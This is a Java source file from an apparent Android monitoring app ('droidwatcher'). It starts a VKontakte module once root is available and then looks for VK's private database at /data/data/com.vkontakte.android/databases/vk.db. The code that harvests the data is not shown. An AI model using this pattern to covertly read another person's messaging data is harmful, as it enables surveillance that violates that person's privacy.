package com.droidwatcher.modules;

import java.io.File;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.preference.PreferenceManager;

import com.droidwatcher.SettingsManager;
import com.droidwatcher.modules.vk.VkModuleBase;
import com.droidwatcher.modules.vk.VkModule_old;
import com.droidwatcher.modules.vk.VkModule_v3;
import com.droidwatcher.services.AppService;

@SuppressLint("SdCardPath")
public class VkModule implements OnSharedPreferenceChangeListener {	
	private Context mContext;
	private SettingsManager mSettings;
	private VkModuleBase mModule;
	
	public VkModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	public synchronized void start(){
		if (!mSettings.isVkEnabled()) {
			return;
		}
		
		if (!isVkAvailable()) {
			return;
		}
		
		if (!AppService.isRootAvailable()) {
			return;
		}
		
		if (mModule != null && mModule.isStarted()) {
			return;
		}
		
		if (isV3()) {
			mModule = new VkModule_v3(mContext);
		}
		else {
			mModule = new VkModule_old(mContext);
		}
		
		mModule.start();
	}
	
	private synchronized void stop(){
		if (mModule != null && mModule.isStarted()) {
			mModule.stop();
		}
	}
	
	public synchronized void dispose(){
		if (mModule != null) {
			mModule.stop();
			mModule = null;
		}
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("VK_ENABLED")){
			if (mSettings.isVkEnabled()) {
				start();
			}
			else{
				stop();
			}
		}
	}
	
	private Boolean isVkAvailable(){
		try {
			mContext.getPackageManager().getPackageInfo("com.vkontakte.android", PackageManager.GET_ACTIVITIES);
			return true;
			
		} catch (NameNotFoundException e) {
			return false;
		}
	}
	
	private Boolean isV3(){
		return new File("/data/data/com.vkontakte.android/databases/vk.db").exists();
	}
}
